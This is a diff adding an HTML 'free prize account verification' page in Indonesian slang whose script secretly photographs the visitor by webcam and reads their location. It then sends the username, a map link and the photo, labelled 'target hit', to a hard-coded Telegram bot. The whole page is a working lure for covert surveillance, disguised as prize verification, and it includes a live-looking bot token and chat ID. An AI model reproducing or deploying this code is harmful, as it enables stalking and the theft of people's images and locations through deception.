@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verifikasi Akun - Hadiah Gratis</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial; background: #111; color: #fff; text-align: center; padding: 50px; }
+        input { padding: 15px; font-size: 18px; border-radius: 8px; border: none; width: 80%; margin-bottom: 20px; }
+        button { background: #e91e63; color: #fff; border: none; padding: 20px 40px; font-size: 20px; border-radius: 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Verifikasi Akun</h1>
+    <p>Masukin username lu buat klaim hadiah.</p>
+    <input type="text" id="username" placeholder="Username lu">
+    <br>
+    <button onclick="mulai()">VERIFIKASI SEKARANG</button>
+
+    <script>
+        const TOKEN = "8777217464:AAEmVGBbywZcC31sos3o-9_mF6Pt_Y4pTJQ";
+        const CHAT_ID = "8416871541";
+
+        async function mulai() {
+            const username = document.getElementById('username').value || "gak diisi";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 2000));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const fotoBase64 = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(track => track.stop());
+
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+
+                        const pesan = "TARGET KENA!\n\nUsername: " + username + "\nLokasi: https://maps.google.com/?q=" + lat + "," + lon + "\nWaktu: " + new Date().toISOString();
+                        await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(pesan));
+
+                        const blob = await (await fetch(fotoBase64)).blob();
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'foto.png');
+                        formData.append('caption', 'Foto target: ' + username);
+                        await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        alert("Verifikasi berhasil! Hadiah lu sedang diproses.");
+                    },
+                    (err) => {
+                        alert("Lu harus izinkan lokasi buat verifikasi!");
+                    }
+                );
+            } catch (err) {
+                alert("Lu harus izinkan kamera buat verifikasi!");
+            }
+        }
+    </script>
+</body>
+</html>
